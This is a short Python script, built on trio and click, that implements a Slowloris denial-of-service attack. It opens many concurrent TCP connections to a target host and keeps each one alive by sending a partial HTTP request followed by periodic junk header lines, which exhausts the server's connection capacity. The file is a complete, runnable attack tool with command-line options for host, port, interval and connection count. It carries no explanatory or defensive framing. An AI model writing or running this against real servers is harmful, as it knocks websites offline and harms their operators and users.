from random import random
from functools import partial
from contextvars import ContextVar

import trio
import click


task_name = ContextVar('task_name')


def log(msg):
    print(f'{task_name.get()}: {msg}')


async def slowloris(host, port, interval, cons):
    task_name.set('main')
    log('started')

    async def worker(label):
        task_name.set(f'worker-{label}')
        log('started')

        while True:
            try:
                log('opening tcp stream...')
                stream = await trio.open_tcp_stream(host, port)

                log('sending request...')
                await stream.send_all(b'GET /?r=%r HTTP/1.1\r\n' % random())

                while True:
                    log('sending headers...')
                    await stream.send_all(b'X-X: %r' % random())

                    log('sleeping...')
                    await trio.sleep(interval)

            except trio.BrokenResourceError as e:
                log(f'error: {e!r}')

            except OSError as e:
                log(f'crashed: {e!r}')
                return

    async with trio.open_nursery() as nursery:
        for i in range(cons):
            nursery.start_soon(worker, i)


@click.argument('port', type=click.INT, default=80)
@click.argument('host')
@click.option('-i', '--interval', type=click.INT, default=10)
@click.option('-c', '--cons', type=click.INT, default=50)
@click.command()
def main(**kwargs):
    trio.run(partial(slowloris, **kwargs))


if __name__ == '__main__':
    main()
